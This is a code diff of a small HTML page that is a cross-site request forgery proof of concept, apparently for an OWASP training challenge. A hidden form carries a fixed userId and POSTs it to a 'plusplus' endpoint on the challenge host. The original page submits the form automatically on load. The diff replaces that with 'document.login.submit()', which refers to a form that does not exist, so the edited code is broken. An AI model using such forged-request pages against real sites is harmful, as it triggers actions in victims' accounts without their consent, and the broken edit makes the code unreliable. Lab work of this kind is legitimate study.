@@ -1,22 +1,9 @@
 <!doctype html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Auto-submit POST demo</title>
-  </head>
-  <body>
-    <p>Submitting…</p>
-
     <form id="f" action="https://owasp02.isc.heia-fr.ch/user/csrfchallengetwo/plusplus" method="POST">
       <input type="hidden" name="userId" value="f5d3d47cf38cfa73aa3b4ef151d083f2bb6d7756" />
     </form>
-
     <script>
-      // Auto-submit when the page loads
-      window.addEventListener("load", () => {
-        document.getElementById("f").submit();
-      });
+      document.login.submit()
     </script>
   </body>
 </html>
